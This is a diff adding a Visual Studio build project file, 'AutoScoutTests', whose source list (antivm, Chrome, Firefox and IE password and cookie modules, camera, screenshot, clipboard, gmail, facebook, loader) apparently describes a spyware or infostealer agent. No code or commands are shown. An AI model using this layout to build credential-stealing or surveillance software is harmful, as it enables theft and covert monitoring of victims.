@@ -1,0 +1,156 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <ProjectGuid>{98D77432-C38A-4C6B-87E9-9CE78259ED4E}</ProjectGuid>
+    <RootNamespace>AutoScoutTests</RootNamespace>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v100</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v100</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup />
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <Optimization>Disabled</Optimization>
+      <SDLCheck>true</SDLCheck>
+      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
+      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;_UNICODE;UNICODE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+    </ClCompile>
+    <Link>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <SubSystem>Windows</SubSystem>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <Optimization>MinSpace</Optimization>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
+      <BufferSecurityCheck>false</BufferSecurityCheck>
+    </ClCompile>
+    <Link>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+    </Link>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="aes.cpp" />
+    <ClCompile Include="antivm.cpp" />
+    <ClCompile Include="base64.cpp" />
+    <ClCompile Include="camera.cpp" />
+    <ClCompile Include="chrome_cookies.cpp" />
+    <ClCompile Include="chrome_password.cpp" />
+    <ClCompile Include="clipboard.cpp" />
+    <ClCompile Include="conf.cpp" />
+    <ClCompile Include="cookies.cpp" />
+    <ClCompile Include="crypt.cpp" />
+    <ClCompile Include="debug.cpp" />
+    <ClCompile Include="device.cpp" />
+    <ClCompile Include="download.cpp" />
+    <ClCompile Include="facebook.cpp" />
+    <ClCompile Include="ffox_password.cpp" />
+    <ClCompile Include="filesystem.cpp" />
+    <ClCompile Include="firefox_cookies.cpp" />
+    <ClCompile Include="gmail.cpp" />
+    <ClCompile Include="ie_cookies.cpp" />
+    <ClCompile Include="ie_password.cpp" />
+    <ClCompile Include="JSON.cpp" />
+    <ClCompile Include="JSONValue.cpp" />
+    <ClCompile Include="loader.cpp" />
+    <ClCompile Include="md5.cpp" />
+    <ClCompile Include="password.cpp" />
+    <ClCompile Include="position.cpp" />
+    <ClCompile Include="proto.cpp" />
+    <ClCompile Include="screenshot.cpp" />
+    <ClCompile Include="sha1.cpp" />
+    <ClCompile Include="social.cpp" />
+    <ClCompile Include="sqlite.c" />
+    <ClCompile Include="sync_thread.cpp" />
+    <ClCompile Include="export.cpp" />
+    <ClCompile Include="main.cpp" />
+    <ClCompile Include="mayhem.cpp" />
+    <ClCompile Include="upgrade.cpp" />
+    <ClCompile Include="utils.cpp" />
+    <ClCompile Include="winhttp.cpp" />
+    <ClCompile Include="zmem.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="aes.h" />
+    <ClInclude Include="antivm.h" />
+    <ClInclude Include="base64.h" />
+    <ClInclude Include="binpatch.h" />
+    <ClInclude Include="camera.h" />
+    <ClInclude Include="chrome_cookies.h" />
+    <ClInclude Include="chrome_password.h" />
+    <ClInclude Include="clipboard.h" />
+    <ClInclude Include="conf.h" />
+    <ClInclude Include="cookies.h" />
+    <ClInclude Include="crypt.h" />
+    <ClInclude Include="debug.h" />
+    <ClInclude Include="device.h" />
+    <ClInclude Include="facebook.h" />
+    <ClInclude Include="ffox_password.h" />
+    <ClInclude Include="filesystem.h" />
+    <ClInclude Include="firefox_cookies.h" />
+    <ClInclude Include="globals.h" />
+    <ClInclude Include="gmail.h" />
+    <ClInclude Include="ie_cookies.h" />
+    <ClInclude Include="ie_password.h" />
+    <ClInclude Include="JSON.h" />
+    <ClInclude Include="JSONValue.h" />
+    <ClInclude Include="loader.h" />
+    <ClInclude Include="main.h" />
+    <ClInclude Include="mayhem.h" />
+    <ClInclude Include="md5.h" />
+    <ClInclude Include="password.h" />
+    <ClInclude Include="position.h" />
+    <ClInclude Include="proto.h" />
+    <ClInclude Include="screenshot.h" />
+    <ClInclude Include="sha1.h" />
+    <ClInclude Include="social.h" />
+    <ClInclude Include="sqlite.h" />
+    <ClInclude Include="upgrade.h" />
+    <ClInclude Include="utils.h" />
+    <ClInclude Include="winhttp.h" />
+    <ClInclude Include="zmem.h" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
